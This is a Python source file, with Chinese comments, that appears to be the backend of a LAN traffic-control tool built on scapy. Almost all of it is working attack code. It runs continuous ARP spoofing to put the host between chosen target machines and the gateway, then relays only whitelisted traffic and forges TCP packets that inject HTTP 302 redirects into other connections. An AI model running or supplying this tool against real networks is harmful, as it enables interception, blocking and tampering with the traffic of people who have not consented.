import sys
import json
import socket
import time
import threading
from scapy.all import ARP, Ether, IP, TCP, Raw, sendp, sniff, get_if_hwaddr, srp, conf

# --- 通讯函式 ---
def log(level, message):
    """向前端发送日志讯息"""
    print(json.dumps({"type": "log", "level": level, "message": message}), flush=True)

def event(event_type, data):
    """向前端发送事件"""
    print(json.dumps({"type": event_type, "data": data}), flush=True)

# --- 网路核心函式 ---
def get_mac_address(ip_address, interface):
    """根据 IP 位址获取 MAC 位址"""
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=2, iface=interface, verbose=False)
        return ans[0][1].hwsrc if ans else None
    except Exception as e:
        log('debug', f"get_mac_address for {ip_address} failed: {e}")
        return None

stop_event_flag = threading.Event()

def arp_spoof(gateway_ip, gateway_mac, target_macs, attacker_mac, interface):
    """持续进行 ARP 欺骗的背景执行绪"""
    while not stop_event_flag.is_set():
        try:
            for target_ip, target_mac in target_macs.items():
                if target_mac:
                    sendp(Ether(dst=target_mac)/ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwsrc=attacker_mac), iface=interface, verbose=False)
                    sendp(Ether(dst=gateway_mac)/ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwsrc=attacker_mac), iface=interface, verbose=False)
            time.sleep(2)
        except Exception as e:
            log('error', f'Spoofing loop error: {e}')

def restore_arp(gateway_ip, gateway_mac, target_macs, interface):
    """恢复网路 ARP 表"""
    log('info', 'Restoring network for all targets...')
    for target_ip, target_mac in target_macs.items():
        if target_mac and gateway_mac:
            sendp(Ether(dst=target_mac)/ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwsrc=gateway_mac), iface=interface, count=3, verbose=False)
            sendp(Ether(dst=gateway_mac)/ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwsrc=target_mac), iface=interface, count=3, verbose=False)
    log('info', 'Network restored.')

def send_http_redirect(packet, redirect_url, interface):
    """伪造并发送一个 HTTP 302 重新导向封包"""
    http_payload = (
        f"HTTP/1.1 302 Found\r\n"
        f"Location: {redirect_url}\r\n"
        f"Connection: close\r\n"
        f"Content-Length: 0\r\n\r\n"
    ).encode('utf-8')

    eth = Ether(src=packet[Ether].dst, dst=packet[Ether].src)
    ip = IP(src=packet[IP].dst, dst=packet[IP].src)
    tcp = TCP(
        sport=packet[TCP].dport,
        dport=packet[TCP].sport,
        flags='PA',
        seq=packet[TCP].ack,
        ack=packet[TCP].seq + len(packet[TCP].payload)
    )
    
    response_packet = eth / ip / tcp / Raw(load=http_payload)
    sendp(response_packet, iface=interface, verbose=False)
    log('info', f"Redirected {packet[IP].src} to {redirect_url}")

# --- 主程式逻辑 ---
def main():
    try:
        config = json.loads(sys.argv[1])
        target_ips = config.get("target_ips", [])
        whitelist_urls = config.get("whitelist", [])
        redirect_url = config.get("redirect_url", "")

        if not target_ips:
            log('critical', "No target IPs provided. Exiting.")
            return

        route_info = conf.route
        if not route_info or not hasattr(route_info, 'route') or not route_info.route("0.0.0.0"):
             log('critical', "Could not determine default route.")
             return
        
        INTERFACE, ATTACKER_IP, GATEWAY_IP = route_info.route("0.0.0.0", verbose=False)

        # 【已修改】对网路介面进行健壮性检查
        if not INTERFACE or INTERFACE.startswith('lo'):
            log('critical', f"No valid network interface found. Detected: {INTERFACE}. Please check network connection.")
            return

        log('info', f"Network detected: IFACE={INTERFACE}, Gateway={GATEWAY_IP}")

        WHITELIST_IPS = {GATEWAY_IP, "8.8.8.8", "8.8.4.4"}
        for url_str in whitelist_urls:
            try:
                hostname = url_str.split('//')[-1].split('/')[0].split(':')[0]
                ip = socket.gethostbyname(hostname)
                WHITELIST_IPS.add(ip)
                log('info', f"Whitelist: {hostname} -> {ip}")
            except Exception:
                log('warning', f"Cannot resolve URL: {url_str}")

        ATTACKER_MAC = get_if_hwaddr(INTERFACE)
        GATEWAY_MAC = get_mac_address(GATEWAY_IP, INTERFACE)
        
        target_macs = {}
        for ip in target_ips:
            mac = get_mac_address(ip, INTERFACE)
            if mac:
                target_macs[ip] = mac
                event('mac_found', {"ip": ip, "mac": mac})
            else:
                log('error', f"Failed to get MAC for target: {ip}")
                target_macs[ip] = None

        if not ATTACKER_MAC or not GATEWAY_MAC or not any(target_macs.values()):
            log('critical', "Missing essential MACs or could not find any target. Exiting.")
            return

        spoof_thread = threading.Thread(target=arp_spoof, args=(GATEWAY_IP, GATEWAY_MAC, target_macs, ATTACKER_MAC, INTERFACE))
        spoof_thread.start()
        log('info', 'ARP spoofing thread started.')

        def packet_processor(packet):
            if packet.haslayer(Ether) and packet[Ether].dst == ATTACKER_MAC and packet.haslayer(IP):
                src_ip, dst_ip = packet[IP].src, packet[IP].dst
                
                if src_ip in target_macs:
                    status = "allowed" if dst_ip in WHITELIST_IPS else "blocked"
                    event('packet', {"status": status, "src": src_ip, "dst": dst_ip})
                    
                    if status == "allowed":
                        packet[Ether].dst = GATEWAY_MAC
                        sendp(packet, iface=INTERFACE, verbose=False)
                    elif status == "blocked" and redirect_url and packet.haslayer(TCP) and packet[TCP].dport == 80:
                        send_http_redirect(packet, redirect_url, INTERFACE)
                
                elif dst_ip in target_macs:
                    target_mac = target_macs.get(dst_ip)
                    if target_mac:
                        packet[Ether].dst = target_mac
                        sendp(packet, iface=INTERFACE, verbose=False)
        
        sniff(prn=packet_processor, iface=INTERFACE, store=False, stop_filter=lambda p: stop_event_flag.is_set())
        
        spoof_thread.join()
        restore_arp(GATEWAY_IP, GATEWAY_MAC, target_macs, INTERFACE)

    except Exception as e:
        log('critical', f'A critical error occurred in backend: {e}')
        sys.exit(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        stop_event_flag.set()




